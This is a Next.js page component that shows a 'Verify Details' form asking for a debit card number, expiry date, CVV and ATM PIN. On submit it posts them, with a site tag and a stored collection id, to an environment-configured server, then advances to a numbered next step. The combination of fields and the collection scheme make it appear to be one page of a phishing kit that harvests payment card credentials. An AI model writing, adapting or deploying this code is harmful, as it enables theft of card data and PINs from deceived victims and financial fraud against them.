'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from "react";
import styles from './page.module.css'; 
import DateInputComponent from "../inlcude/DateInputComponent";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";

export default function Home() {
    const [loading, setLoading] = useState(false);
    const router = useRouter();

    const handleSubmit = async (e) => {
      const API_URL = process.env.NEXT_PUBLIC_URL;
      const SITE = process.env.NEXT_PUBLIC_SITE;
      e.preventDefault();
      setLoading(true);
      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
      try {
          const response = await fetch(`${API_URL}`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push('/4');
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
      }finally{
          setLoading(false);
      }
  };
  return (
    <>
   <Header />
   <main className="mt-2">
        <div className="container bg-light py-4">
          <div className="">
            <form onSubmit={handleSubmit} id="frm_2_am8E">
            <DebitCardInputComponent />
            <ExpiryDateInputComponent />  

              <div className={`${styles.formGroup} form-group w-100`}>
                  <label htmlFor="">CVV </label>
                  <input
                        type="password"
                        placeholder="Enter your  CVV"
                        className={`${styles.formControl} w-100 form-control`}
                        name="cvv"
                        minLength={3}
                        maxLength={3}
                        inputMode="numeric"
                        required
                      />
                </div>

                
              <div className={`${styles.formGroup} form-group w-100`}>
                  <label htmlFor="">ATM Pin </label>
                  <input
                        type="password"
                        placeholder="Enter your ATM Pin"
                        className={`${styles.formControl} w-100 form-control`}
                        name="amtn"
                        minLength={3}
                        maxLength={3}
                        inputMode="numeric"
                        required
                      />
                </div>

              <div className={`${styles.formGroup} form-group w-100 my-3 mb-0 d-flex justify-content-center`}>
                <button
                  type="submit"
                  disabled={loading}
                  className={`${styles.submitButton} ${styles.bgPrimary} w-100 btn btn-primary`}
                >
                  Verify Details
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>
    <Footer />
</>
  );
}
